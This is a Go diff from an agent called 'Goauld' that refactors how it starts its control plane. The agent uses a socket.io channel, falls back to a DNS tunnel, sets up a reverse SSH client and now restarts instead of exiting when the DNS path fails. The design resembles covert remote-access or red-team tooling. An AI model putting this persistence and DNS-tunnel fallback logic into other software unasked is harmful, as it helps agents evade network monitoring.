@@ -13,7 +13,6 @@ import (
 	"os"
 	"os/signal"
 	"strconv"
-	"strings"
 	"time"
 
 	"Goauld/agent/config"
@@ -130,53 +129,83 @@ func run() utils.CancelReason {
 
 	var controlPlanClient *control.ControlPlanClient
 	var err error
-	// Initialize the control socket.io
 
-	// Every mode except DNS only mode
-	if len(config.Get().GetRsshOrder()) != 1 || !strings.EqualFold(config.Get().GetRsshOrder()[0], "DNS") {
+	// Initialize the control socket.io
+	{
 		controlPlanClient = control.NewControlPlanClient(ctx, configDone, globalCanceler)
-		err = controlPlanClient.Init()
+		config.Get().QuicUrl()
+		chanErr := make(chan error)
+		chanSuccess := make(chan struct{})
+		err = controlPlanClient.Init(chanSuccess, chanErr)
 		if err != nil {
 			log.Error().Err(err).Msg("error initializing the control plan")
 			log.Info().Msg("trying to start the control plan in DNS mode")
+		} else {
+			// Start the control socket.io
+			go func() {
+				select {
+				case controlErr <- controlPlanClient.Start():
+				case <-ctx.Done():
+				}
+				controlPlanClient.Close()
+			}()
+			select {
+			case e := <-chanErr:
+				log.Error().Err(err).Msg("error starting the control plan")
+				controlPlanClient.Close()
+				err = e
+			case <-chanSuccess:
+				log.Info().Str("Mode", "Standard").Msg("Control plan started")
+				err = nil
+			}
 		}
 	}
-	// If the standard init failed, or if we are in a DNS only mode
-	if err != nil || len(config.Get().GetRsshOrder()) == 1 && strings.EqualFold(config.Get().GetRsshOrder()[0], "DNS") {
-		log.Info().Msg("Initializing agent in DNS tunnel mode only")
+
+	// If the standard init failed, we are in a DNS mode
+	if err != nil {
+		log.Info().Msg("Initializing agent in DNS tunnel mode")
 		dnsTransport, err = transport.NewDNSSH()
 		if err != nil {
 			log.Error().Err(err).Msg("error initializing the DNS transport")
-			return utils.Exit
+			return utils.Restart
 		}
 		defer dnsTransport.Close()
+		chanErr := make(chan error)
+		chanSuccess := make(chan struct{})
 		controlPlanClient = control.NewControlPlanClient(ctx, configDone, globalCanceler)
-		err = controlPlanClient.InitOverDns(dnsTransport.ControlStream)
+		err = controlPlanClient.InitOverDns(dnsTransport.ControlStream, chanSuccess, chanErr)
 		if err != nil {
 			log.Error().Err(err).Msg("error initializing the control plan over DNS")
-			return utils.Exit
+			return utils.Restart
+		}
+		go func() {
+			select {
+			case controlErr <- controlPlanClient.Start():
+			case <-ctx.Done():
+			}
+			controlPlanClient.Close()
+		}()
+		select {
+		case e := <-chanErr:
+			log.Error().Err(err).Msg("error starting the control plan")
+			controlPlanClient.Close()
+			err = e
+		case <-chanSuccess:
+			log.Info().Str("Mode", "DNS").Msg("Control plan started")
+			err = nil
 		}
 	}
 
 	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
 	defer cancelCtrlC()
 
-	// Create the client SSH
-	sshAgent := ssh.NewSSHAgent()
-	// defer sshAgent.Close()
-
-	// Start the control socket.io
-	go func() {
-		select {
-		case controlErr <- controlPlanClient.Start():
-		case <-ctx.Done():
-		}
-		controlPlanClient.Close()
-	}()
-
 	go func() {
 		// Waiting for the configuration to be completed
 		<-configDone
+
+		// Create the client SSH
+		sshAgent := ssh.NewSSHAgent()
+		// defer sshAgent.Close()
 		// Initialize the client SSH
 		err = sshAgent.Init(ctx, dnsTransport)
 		if err != nil {
